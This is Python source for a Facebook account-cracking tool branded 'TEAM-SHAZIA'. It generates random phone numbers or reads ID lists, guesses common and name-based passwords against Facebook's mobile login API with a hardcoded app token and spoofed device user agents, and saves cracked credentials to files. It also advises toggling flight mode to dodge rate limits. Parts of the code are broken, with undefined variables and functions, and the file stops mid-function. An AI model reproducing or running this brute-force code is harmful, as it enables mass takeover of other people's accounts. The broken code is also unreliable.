y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[38;5;208m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m") 

logo =("""   
\033[1;31m    888    d8P  8888888b.   .d8888b.  
\033[1;31m    888   d8P   888   Y88b d88P  Y88b 
\033[1;32m    888  d8P    888    888 Y88b.      
\033[1;33m    888d88K     888   d88P  "Y888b.   
\033[1;33m    8888888b    8888888P"      "Y88b. 
\033[1;31m    888  Y88b   888 T88b         "888 
\033[1;34m    888   Y88b  888  T88b  Y88b  d88P 
\033[1;34m    888    Y88b 888   T88b  "Y8888P"  
\t\t\t   \033[1;33mIBRAHIM♥️ MARIYA
\033[1;36m============================================
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mARYAN \033[1;36m&& \033[1;32mKASHIF
\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m ArYan KhAn
\033[1;36m   \033[1;35mGITHUB       :  \033[1;35mTEAM-SHAZIA
\033[1;32m   \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m   \033[1;35mTEAM         :  \033[1;35mSHAZIA
\033[1;34m   \033[1;32mTOOL VIRSION :  \033[1;32m4.5
\033[1;36m============================================\n""")


def linex():
	print('\033[1;36m============================================')
def lines():
	print('\033[1;36m============================================')

loop = 0
ok = []
cp = []
tf = []
tl = []
ua_android = []
ua_opera = []
#split_function

#------------------[ USER-AGENT ]-------------------#
pretty.install()

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def exit():
	os.sys.exit()
def show(text):
	print(text)
	linex()
def clear():
	os.system('clear')






def file_crack():
	global ok,cp,tf
	os.system('clear')
	print(logo)
	print('\033[1;92m  [\033[1;93m1\033[1;92m] \033[1;93mMethod 1')
	#print('  \033[1;92m[\033[1;93m2\033[1;92m] \033[1;93mMethod 2')
	#print('  \033[1;92m[\033[1;93m3\033[1;92m] \033[1;93mMethod 3\n')
	linex()
	opt_method = input('  Choose Method: ')
	os.system('clear')
	print(logo)
	show('  \033[1;92m[\033[1;93m•\033[1;92m] \033[1;93mExample \033[1;97m: \033[1;93m/sdcard/shazia.txt')
	file = input(' Put file path: ')
	linex()
	
	
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(' Path Maybe Wrong ...')
		time.sleep(1)
		file_crack()
	plist = []
	try:
		clear()
		print(logo)
		ps_limit = int(input('\033[1;93m How many passwords do you want to add ? '))
		
	except:
		ps_limit =1
	clear()
	print(logo)
	#print("")
	
	print('\033[1;32m Exp\033[1;97m : \033[1;93mfirst last,firtslast,first123')
	print('\033[1;35m============================================\n')
	
	for i in range(ps_limit):
		plist.append(input(f' \033[1;92mPut password {i+1}: \033[1;93m'))
	with ThreadPool(max_workers=30) as crack_submit:
		os.system('clear')
		print(logo)
	  #  show(' Use flight mode before using starting crack')
		total_ids = str(len(fo))
		print('  \033[1;92m[\033[1;93m+\033[1;92m] Total IDs: '+total_ids)
		print("  \033[1;92m[\033[1;95mNOTE\033[1;92m] \x1b[1;91mUse Flight Mode In Every 3 min\033[1;37m")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if opt_method =='1':
				crack_submit.submit(method1,ids,names,passlist,total_ids)
			elif opt_method =='2':
				crack_submit.submit(method2,ids,names,passlist,total_ids)
			elif opt_method =='3':
				crack_submit.submit(method3,ids,names,passlist,total_ids)
			else:
				crack_submit.submit(method3,ids,names,passlist,total_ids)
	linex()
	print(' The process has completed')
	print(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
	input('\n Press enter to back ')
	fia()



def channal():
	clear()
	print(logo)
	print('  \033[1;92m[\033[1;93m1\033[1;92m] \033[1;93mSubscribe Channal')
	print('  \033[1;92m[\033[1;93m2\033[1;92m] \033[1;93mEXIT')
	
	
	
	linex()
	aaa=input('  Select option :')
	if aaa =='1':
		os.system('xdg-open https://www.youtube.com/@shaziasardarni-zd5gv');fia()
	if aaa =='2':
		exit()
	


def fia():
			
			#clear();print(" \033[1;92m  \n\n\tFollow My Github For More Command");os.system('xdg-open https://github.com/TEAM-SHAZIA');time.sleep(5)
			
			clear()
			print(logo)
			print('  \033[1;92m[\033[1;93m1\033[1;92m] \033[1;93mFILE CLONING')
			print('  \033[1;92m[\033[1;93m2\033[1;92m] \033[1;93mRANDOM CLONING')
			
			
			print('  \033[1;92m[\033[1;93m3\033[1;92m] \033[1;93mSUBSCRIBE MY CHANNAL')
			print('  \033[1;92m[\033[1;93m0\033[1;92m]\033[1;91m Exit \n')
			linex()
			xd=input(' Choose an option: ')
			if xd in ['1','01']:
				file_crack()
			elif xd in ['A','0A']:
				method_crack()
				
			elif xd in ['2','02']:
				rdx2()
			elif xd in ['3','03']:
				bd()
			elif xd in ['4','04']:
				gmail()
			elif xd in ['3','03']:
				os.system('xdg-open https://www.youtube.com/@shaziasardarni-zd5gv')
			elif xd in ['6','06']:
				exit()
			else:
				print(' Option not found...');fia()
#------------pak------------------
def rdx():
	clear()
	print(logo)
	print('  \033[1;92m[\033[1;93m1\033[1;92m] \033[1;93mMethod 1')
	print('  \033[1;92m[\033[1;93m2\033[1;92m] \033[1;93mMethod 2')
	print('\033[1;92m  [\033[1;93m3\033[1;92m] \033[1;93mMethod 1\033[1;92m (\033[1;97mMANUALY\033[1;92m)')
	
	print('  \033[1;92m[\033[1;93m0\033[1;92m] \033[1;91mBack')
	linex()
	aaa=input('  Select option :')
	if aaa =='1':
		rdx1()
	if aaa =='2':
		rdx2()
	if aaa =='3':
		choice()
	if aaa =='0':
		fia()
	else:
		print('  \033[1;92m[\033[1;93m•\033[1;92m] Select One of these');rdx()
def rdx1():
				user=[]
				
				os.system('clear') 
				print(logo)
				print('  \033[1;92m[\033[1;93m•\033[1;92m] Example : 0301,0318,0333,0345 Etc')
				print('\x1b[1;91m  \033[1;92m[\033[1;93m•\033[1;92m] See note : Use Your Country Code ')
				linex()
				code = input('\033[1;37m put code: ')
			
				try:
						limit = int(input('\033[1;37m put limit: '))
				except ValueError:
						limit = 5000
				for nmbr in range(limit):
						nmp = ''.join(random.choice(string.digits) for _ in range(7))
						user.append(nmp)
				with tred(max_workers=40) as SHAZIAS:	 
						os.system('clear')
						tl = str(len(user))
						print(logo)
						print('  \033[1;92m[\033[1;93m+\033[1;92m] Total Account : \033[1;32m'+tl)
						print(f'  \033[1;92m[\033[1;93m+\033[1;92m]\033[1;37m Choice Code ..:\033[1;32m '+code)
						print("  \033[1;92m[\033[1;95mNOTE\033[1;92m] \x1b[1;91mUse Flight Mode In Every 3 min\033[1;37m")
						linex()
						for psx in user:
								ids = code+psx
								passlist = [psx,ids,'khankhan','khan1122','khan123','baloch123','baloch','pakistan','i love you']
								
								IBRAHIM.submit(KKK1,ids,passlist)
							
				print('\033[1;37m')
				linex()
				print(' The Process Has Completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press Enter To Back ')
				fia()


xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#
def rdx2():
				user=[]
				os.system('clear') 
				print(logo)
				print('  \033[1;92m[\033[1;93m•\033[1;92m] Example : 0301,0318,0333,0345Etc')
				print('\x1b[1;91m  \033[1;92m[\033[1;93m•\033[1;92m] See note : Use Your Country Code ')
				linex()
				code = input('\033[1;37m Put Code: ')
			
				try:
						limit = int(input('\033[1;37m Put Limit: '))
				except ValueError:
						limit = 5000
				for nmbr in range(limit):
						nmp = ''.join(random.choice(string.digits) for _ in range(7))
						user.append(nmp)
				with tred(max_workers=40) as SHAZIAS:	 
						os.system('clear')
						tl = str(len(user))
						print(logo)
						print('  \033[1;92m[\033[1;93m+\033[1;92m] Total account : \033[1;32m'+tl)
						print(f'  \033[1;92m[\033[1;93m+\033[1;92m]\033[1;37m Choice code ..:\033[1;32m '+code)
						print("  \033[1;92m[\033[1;95mNOTE\033[1;92m] \x1b[1;91mUse Flight Mode In Every 3 min\033[1;37m")
						linex()
						for psx in user:
								ids = code+psx
								passlist = [psx,ids,'khankhan','khan1122','khan123','baloch123','baloch','pakistan','i love you']
								SHAZIAS.submit(KKK2,ids,passlist)
				print('\033[1;37m')
				linex()
				print(' The Process Has Completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press Enter To Back ')
				fia()
				
#

#------choice-----
def choice():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('  \033[1;92m[\033[1;93m•\033[1;92m] Example : 0301,0318,0333,0345 Etc')
    linex()
    code = input(' Your Code : ')
    clear()
    print(logo)
    print('  \033[1;92m[\033[1;93m+\033[1;92m] E.g 1000,2000,5000,10000***,Etc')
    linex()
    limit = int(input('  Your limit : \033[1;93m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("  \033[1;92m[\033[1;93m+\033[1;92m] \033[1;93mEnter Password Limit : "))
    HamiiID = []
    print("")
    clear()
    print(logo)
    print(' \033[1;92m Examples \033[1;97m: \033[1;93mkhankhan,khan112,pakistan,***Etc')
    linex()
    for bilal in range(passx):
        pww = input(f"  \033[1;92m[\033[1;93m+\033[1;92m] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=40) as SHAZIAS:
        clear()
        print(logo)
        tl = str(len(user))
        print('  \033[1;92m[\033[1;93m+\033[1;92m] \033[1;93mTotal idz\033[1;97m :\033[1;92m '+tl)
        print('  \033[1;92m[\033[1;93m+\033[1;92m] \033[1;93mYour code\033[1;97m :\033[1;92m '+code)
        print("  \033[1;92m[\033[1;93m+\033[1;92m] \x1b[1;91mUse Flight Mode In Every 3 min\033[1;37m")
        linex()
        for love in user:
            passlist = [love[1:]]
            ids = code+love
            for Eman in HamiiID:
                passlist.append(Eman)
                passlist.append(love)
            SHAZIAS.submit(KKK2,ids,passlist)
    print('\033[1;36m============================================')
    print('Crack Process Has Been Completed')
    print('IDs Saved In IBRAHIM-OK.txt,IBRAHIM-CP.txt')
    print('\033[1;36m============================================')
    fia()

mod = ['GT-I9190', 'KOT49H', 'GT-I9192', 'KOT49H', 'GT-I9300I', 'KTU84P', 'GT-I9300', 'IMM76D', 'GT-I9300', 'JSS15J', 'GT-I9301I', 'KOT4', 'GT-I9301I', 'KOT49H', 'GT-I9500', 'JDQ39', 'GT-I9500', 'LRX22C', 'GT-N5100', 'JZO54K', 'GT-N7100', 'KOT49H', 'GT-N8000', 'JZO54K', 'GT-N8000', 'KOT49H', 'GT-P3110', 'JZO54K', 'GT-P5100', 'IML74K', 'GT-P5100', 'JDQ', 'GT-P5100', 'JDQ39', 'GT-P5100', 'JZO54K', 'GT-P5110', 'JDQ39', 'GT-P5200', 'KOT49H', 'GT-P5210', 'KOT49H', 'GT-P5220', 'JDQ39', 'GT-S7390', 'JZO54K', 'SAMSUNG', 'SM-A500F', 'SAMSUNG', 'SM-G532F', 'SAMSUNG', 'SM-G920F', 'SAMSUNG', 'SM-G935F', 'SAMSUNG', 'SM-J320F', 'SAMSUNG', 'SM-J510FN', 'SAMSUNG', 'SM-N920S', 'SAMSUNG', 'SM-T280', 'SM-A500FU', 'MMB29M', 'SM-A500F', 'LRX22G', 'SM-A500F', 'MMB29M', 'SM-A500H', 'MMB29M', 'SM-G900F', 'KOT49H', 'SM-G920F', 'MMB29K', 'SM-G920F', 'NRD90M', 'SM-G930F', 'NRD90M', 'SM-G935F', 'MMB29K', 'SM-G935F', 'NRD90M', 'SM-G950F', 'NRD90M', 'SM-J320FN', 'LMY47V', 'SM-J320F', 'LMY4', 'SM-J320F', 'LMY47V', 'SM-J320H', 'LMY47V', 'SM-J320M', 'LMY47V', 'SM-J510FN', 'MMB29M', 'SM-J510FN', 'NMF2', 'SM-J510FN', 'NMF26X', 'SM-J510FN', 'NMF26X;', 'SM-J701F', 'NRD90M;', 'SM-T111', 'JDQ39', 'SM-T230', 'KOT49H', 'SM-T231', 'KOT49H', 'SM-T235', 'KOT4SM-T310', 'KOT49H', 'SM-T311', 'KOT4', 'SM-T311', 'KOT49H', 'SM-T315', 'JDQ39', 'SM-T525', 'KOT49H', 'SM-T531', 'KOT49H', 'SM-T531', 'LRX22G', 'SM-T535', 'LRX22G', 'SM-T555', 'LRX22G', 'SM-T561', 'KTU84P', 'SM-T705', 'LRX22G', 'SM-T705', 'LRX22G', 'SM-T805', 'LRX22G', 'SM-T820', 'NRD90M', 'SPH-L720', 'KOT49H']
pppp = ['GT-I9190', 'KOT49H', 'GT-I9192', 'KOT49H', 'GT-I9300I', 'KTU84P', 'GT-I9300', 'IMM76D', 'GT-I9300', 'JSS15J', 'GT-I9301I', 'KOT4', 'GT-I9301I', 'KOT49H', 'GT-I9500', 'JDQ39', 'GT-I9500', 'LRX22C', 'GT-N5100', 'JZO54K', 'GT-N7100', 'KOT49H', 'GT-N8000', 'JZO54K', 'GT-N8000', 'KOT49H', 'GT-P3110', 'JZO54K', 'GT-P5100', 'IML74K', 'GT-P5100', 'JDQ', 'GT-P5100', 'JDQ39', 'GT-P5100', 'JZO54K', 'GT-P5110', 'JDQ39', 'GT-P5200', 'KOT49H', 'GT-P5210', 'KOT49H', 'GT-P5220', 'JDQ39', 'GT-S7390', 'JZO54K', 'SAMSUNG', 'SM-A500F', 'SAMSUNG', 'SM-G532F', 'SAMSUNG', 'SM-G920F', 'SAMSUNG', 'SM-G935F', 'SAMSUNG', 'SM-J320F', 'SAMSUNG', 'SM-J510FN', 'SAMSUNG', 'SM-N920S', 'SAMSUNG', 'SM-T280', 'SM-A500FU', 'MMB29M', 'SM-A500F', 'LRX22G', 'SM-A500F', 'MMB29M', 'SM-A500H', 'MMB29M', 'SM-G900F', 'KOT49H', 'SM-G920F', 'MMB29K', 'SM-G920F', 'NRD90M', 'SM-G930F', 'NRD90M', 'SM-G935F', 'MMB29K', 'SM-G935F', 'NRD90M', 'SM-G950F', 'NRD90M', 'SM-J320FN', 'LMY47V', 'SM-J320F', 'LMY4', 'SM-J320F', 'LMY47V', 'SM-J320H', 'LMY47V', 'SM-J320M', 'LMY47V', 'SM-J510FN', 'MMB29M', 'SM-J510FN', 'NMF2', 'SM-J510FN', 'NMF26X', 'SM-J510FN', 'NMF26X;', 'SM-J701F', 'NRD90M;', 'SM-T111', 'JDQ39', 'SM-T230', 'KOT49H', 'SM-T231', 'KOT49H', 'SM-T235', 'KOT4SM-T310', 'KOT49H', 'SM-T311', 'KOT4', 'SM-T311', 'KOT49H', 'SM-T315', 'JDQ39', 'SM-T525', 'KOT49H', 'SM-T531', 'KOT49H', 'SM-T531', 'LRX22G', 'SM-T535', 'LRX22G', 'SM-T555', 'LRX22G', 'SM-T561', 'KTU84P', 'SM-T705', 'LRX22G', 'SM-T705', 'LRX22G', 'SM-T805', 'LRX22G', 'SM-T820', 'NRD90M', 'SPH-L720', 'KOT49H']

def method1(ids,names,passlist,total_ids):
	global loop,ok,cp,tf
	rcol =['\033[1;32m m2','\033[1;31m m1']
	rr = ['\033[1;32m m1']
	whi = '\033[0;97m'
	sys.stdout.write('\r  [IBRAHIM-M1] %s/%s OK/CP/2F : %s/%s/%s        \r'%(loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = device['android_version']
			model = device['model']
			build = device['build']
			fblc = device['fblc']
			fbcr = sim_id
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			fbca = device['fbca']
			fbdm = device['fbdm']
			fbfw = '1'
			fbrv = '0'
			fban = 'FB4A'
			fbpn = 'com.facebook.katana'
			nmm = random.choice(pppp)
			ua = (uaku)
			#ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+nmm+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/v2020;FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
			random_seed = random.Random()
			adid = str(uuid.uuid4())
			aadid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
			device_id = str(uuid.uuid4())
			secure = str(uuid.uuid4())
			family = str(uuid.uuid4())
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			xd =str(''.join(random_seed.choices(string.digits, k=20)))
			sim_serials = f'["{xd}"]'
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			jazoest = li2+j1
			data = {'adid':aadid,
			'email':ids,
			'password':pas,
			'cpl':'true',
			'credentials_type':'device_based_login_password',
			"source": "device_based_login",
			'error_detail_type':'button_with_disabled',
			'source':'login','format':'json',
			'meta_inf_fbmeta': '',
			'generate_session_cookies':'1',
			'generate_analytics_claim':'1',
			'generate_machine_id':'1',
			'currently_logged_in_userid': '0',
			"locale":"en_US","client_country_code":"US",
			'family_device_id':nmm,
			'device_id':adid,
			'advertiser_id': adid,
			"method": "auth.login",
			"fb_api_req_friendly_name": "authenticate",
			"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
			'api_key': '882a8490361da98702bf97a021ddc14d'}
			headers = {
			'content-type':'application/x-www-form-urlencoded',
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-type':'MOBILE.LTE',
			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'user-agent':ua,
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
			'x-fb-connection-quality':'EXCELLENT',
			'Connection': 'keep-alive',
			'x-fb-friendly-name':'ViewerReactionsMutation',
			'accept-encoding':'gzip, deflate',
			'accept': '*/*',
			'x-fb-http-engine': 'Liger',
			'content-length': '204'}
			url = 'https://b-graph.facebook.com/auth/login'
			twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			tu = 'checkpoint/828281030927956/?next=https%3A%2F%2Fweb.facebook.com%2F'
			po = requests.post(url,data=data,headers=headers).json()
			if 'access_token' in po:
				print('   \033[1;32m[IBRAHIM-OK] '+ids+' | '+pas+           '\033[0;97m')
				ok.append(ids)
				open('/sdcard/IBRAHIM-OK.txt','a').write(ids+' | '+pas+'\n')
				
				
				
				break
			elif 'two_factor' in str(po):
				print('\033[1;36m   [IBRAHIM-2F] '+ids+' | '+pas+            '\033[0;97m')
				
				tf.append(ids)
				open('/sdcard/IBRAHIM-2F.txt','a').write(ids+' | '+pas+'\n')
				break
			elif 'www.facebook.com' in str(po):
				print('   \033[1;91m[SHAZIA-CP] '+ids+' | '+pas+            '\033[0;97m')
				
				cp.append(ids)
				open('/sdcard/IBRAHIM-CP.txt','a').write(ids+' | '+pas+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
		passo

ll = ['era1X', 'SM-G996N', 'moto', 'SOV42', 'SOV42', 'moto', 'Redmi', 'KB2000', 'V1981A', 'PL5003', 'SM-T561', 'T95ZPLUS', 'ROBBY', 'LG-H871S', 'SKWHP40A-ZWL', 'motorola', 'KM6', 'E6833', 'SM-A705MN', 'DP7CPRO', 'DL3', 'Datsun_D5001', 'LG-H735', 'vivo', 'Google', '706SH', 'X100', 'C5', 'ONE', 'Moto', 'G20', 'C18_Pro', 'hatch', 'Smart_Light', 'SOV43', 'KYV41', 'PICOphone', 'Lenovo', 'AFTSSS', 'CPH2067', 'motorola', 'SM-A705FN', 'HTC_M9u', 'SM-A307GT', 'Sofia', 'H8416', 'Pixel', 'FlipkartTV', 'vivo', 'Redmi', 'vivo', 'soda', 'Lenovo', 'Hi9plus', 'M1', 'General', '5051X', 'Expanse', 'moto', 'ZTE', 'GN5001S', 'T790Z', 'TZ752', 'Leelbox', 'T95MAX', 'SM-A716S', 'moto', 'Andromax', 'moto', 'S20+', 'Micromax', 'Pixel', 'Lenovo', 'I4213', 'TECNO', 'S60Lite', 'SM-T860', 'XT1635-02', 'moto', 'AFTSS', 'IRON', 'SM-G998N', 'SM-J415GN', 'LG-V522', 'POLYTRON', 'T03', 'SM-J111F', 'LEAGOO', 'KOB-L09', 'SM-J700F', 'SM-N920T', 'Lenovo', 'Moto', 'LG-K430', 'SM-G532F', 'AP-107G', 'ZTE', 'MIX', 'U;', 'A37f"', 'MYA-L22', 'DLI-TL20', 'Redmi', 'U;', 'LG-D724"', 'SM-G900F', 'T5c', 'SM-J200H', 'D6503', 'Lenovo', 'NEXBOX-A95X', 'LS-4505', 'SM-G390F', 'FRD-L19', 'SM-G920F', 'LEO_DG280', 'SM-T350', 'HUAWEI', 'Lenovo', 'Tele2_Mini_1.1', 'Lenovo', 'SM-N9200', 'Aquaris', 'SM-G950U', 'SM-J710GN', 'SM-N9005', 'SM-G955F', 'SM-G900I', 'SM-T700', 'SAMSUNG-SM-G930A', 'SM-C5000', 'XT1575', 'SM-A310F', 'HTC_0PJA10', 'SM-T535', 'XT1609', 'SM-J530Y', 'XT1635-01', 'SM-N920V', 'SM-A320FL', 'SM-G930F', 'LG-M154', 'SM-G950F', 'Nexus', 'Lenovo', 'XT1585', 'SM-J701F', 'vivo', 'SM-J106H', 'WAS-LX1A', 'Moto', 'CRO-L03', 'vivo', 'ONEPLUS', 'U10', 'SM-G950N', 'ASUS_Z00AD', 'SHV39', 'LG-H873', 'K10000', 'SM-A730F', 'SM-J500M', 'SM-G532M', 'Nexus', 'F3311', '5022X', 'SM-N950U', 'SM-G925W8', 'SM-G920I', 'LG-H870DS', 'U16', 'iQD700', 'SM-A320F', 'Nexus', '2014817', 'ASUS_Z00TD', 'SM-J500H', 'CPH1609', 'E6883', 'Lenovo', 'Ilium', 'SM-J510FN', 'Nexus', 'SM-G532G', 'SM-J105H', 'HTC', 'SM-J120H', 'X20', 'MX6', 'SM-G920T', 'ViewPad_M10', 'WAS-L03T', 'SM-N950U', 'LG-M150', 'ZTE', 'SM-N9500', 'SM-J510F', 'LGLS775', 'LG-H830', 'Aqua', 'Nomi', '5022D', '6055K', 'VTR-L29', 'X5max_PRO', 'SM-G935W8', 'X2', 'SM-J700M', 'SM-G9500', 'ZTE', 'X5_Max_Pro', 'ZTE', 'DIG-L21HN', 'SM-T285', 'SM-G965U', 'SM-A300H', 'NEM-L51', 'Lenovo', 'Lenovo', 'LG-K130', 'SMART_Surf_4G', 'LG-X210', 'Pace_4G', 'ZTE', 'SLA-L22', 'FS517', 'Impress_Lion_4G', 'ZB500KL', 'Micromax', 'Neffos', 'Tele2_Maxi_Plus', 'Ixion', 'JMM-AL00', 'LLD-L31', 'C6903', 'Lenovo', 'Impress_Luck', 'NX531J', 'SM-G361H', 'Z982', 'G3121', 'F5321', 'EDI-AL10', 'TA-1053', 'PLE-701L', 'M510', 'LS-4505', 'LG-D693n', 'SM-G550FY', 'YU5010A', 'Lenovo', 'VS988', 'Z981', 'Pixel', 'm1', 'VKY-L09', 'LG-H540', 'Z14', 'Moto', 'SM-G955U', 'SM-N920P', 'SM-A500FU', 'TECNO-J8', 'KFAUWI', 'LG-K330', 'U15S', 'SM-G800H', 'D5503', 'D6653', 'SCV37', 'K010', 'CRO-L22', 'itel', 'GT-I9500', 'WAS-LX1', 'SM-J111M', 'SM-S903VL', 'SM-J210F', 'LG-D802', 'F3313', 'XT1565', 'SM-G900M', 'MHA-L29', 'ONE', 'ZTE', 'SM-G610M', 'LG-M700', 'Lenovo', 'LG-M160', 'VS820', 'SM-G570M', 'Pixel', 'SM-J700P', 'CAM-L03', 'HUAWEI', 'SM-T280', 'ZTE', 'SM-J510MN', 'SM-G935U', 'TRT-LX1', 'HT37', 'ALE-L21', 'Monaco', 'Aquaris_M4.5', 'Pixel', 'Moto', 'SAMSUNG-SM-G930A', 'SM-N950F', 'SM-G960U', 'P8000', 'Power', 'XT1650', 'LG-X165g', 'ZTE', 'LG-M210', 'HUAWEI', 'SM-T531', 'Nexus', 'HUAWEI', 'XT1254', 'A1601', 'XT1706', 'SM-G930U', 'SM-N920C', 'S6', 'Moto', 'C6502', 'LIFETAB_P831X.2']


def method2(ids,names,passlist,total_ids):
	global loop,ok,cp,tf
	rcol =['\033[1;32m m2','\033[1;31m m1']
	rr = ['\033[1;32m m1']
	whi = '\033[0;97m'
	sys.stdout.write('\r  [SHAZIA-M2] %s/%s OK/CP/2F : %s/%s/%s         \r'%(loop,total_ids,len(ok),len(cp),len(tf)));sys.stdout.flush()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = device['android_version']
			model = device['model']
			build = device['build']
			fblc = device['fblc']
			fbcr = sim_id
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			fbca = device['fbca']
			fbdm = device['fbdm']
			fbfw = '1'
			fbrv = '0'
			fban = 'FB4A'
